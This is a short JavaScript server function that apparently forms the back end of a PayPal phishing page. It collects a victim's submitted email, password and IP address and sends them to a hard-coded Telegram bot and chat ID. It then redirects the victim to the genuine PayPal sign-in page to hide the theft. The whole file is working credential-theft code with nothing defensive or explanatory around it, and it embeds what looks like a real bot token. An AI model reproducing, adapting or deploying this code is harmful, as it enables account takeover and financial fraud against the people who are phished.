// ============================================================
// CONFIG - TOKEN & CHAT ID ADDED
// ============================================================
const BOT_TOKEN = '8926881219:AAFEhuTyYVbgIMDDiV8JDZ2ivXmz4elyGBI';
const CHAT_ID = '8510854191';
const REDIRECT_URL = 'https://www.paypal.com/signin';
// ============================================================

module.exports = async (req, res) => {
    if (req.method !== 'POST') {
        return res.status(405).send('Method Not Allowed');
    }

    const email = req.body.email || 'Not provided';
    const password = req.body.password || 'Not provided';
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';
    const time = new Date().toISOString().replace('T', ' ').slice(0, 19);

    const msg = `🔐 *PAYPAL DATA*\n👤 *Email:* ${email}\n🔑 *Pass:* ${password}\n🌐 *IP:* ${ip}\n🕐 *Time:* ${time}`;
    
    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: msg,
                parse_mode: 'Markdown'
            })
        });
    } catch (e) {}

    res.redirect(REDIRECT_URL);
};
